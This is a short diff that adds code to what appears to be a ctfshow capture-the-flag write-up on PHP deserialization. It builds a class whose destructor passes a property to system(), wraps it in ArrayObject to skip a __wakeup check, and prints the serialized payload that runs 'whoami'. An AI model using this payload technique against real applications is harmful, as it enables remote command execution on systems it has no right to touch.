@@ -14,12 +14,29 @@
     
 
 ```php
+<?php
+
+class ctfshow {
+    public $ctfshow;
+    
+    public function __wakeup(){
+        die("not allowed!");
+    }
+    
+    public function __destruct(){
+        echo "OK";
+        system($this->ctfshow);
+    }
+}
 $a=new ctfshow;
 $a->ctfshow="whoami";
 $arr=array("evil"=>$a);
 $oa=new ArrayObject($arr);
 $res=serialize($oa);
 echo $res;
+//unserialize($res)
+?>
+#C:11:"ArrayObject":77:{x:i:0;a:1:{s:4:"evil";O:7:"ctfshow":1:{s:7:"ctfshow";s:6:"whoami";}};m:a:0:{}}
 ```
 
 ```php
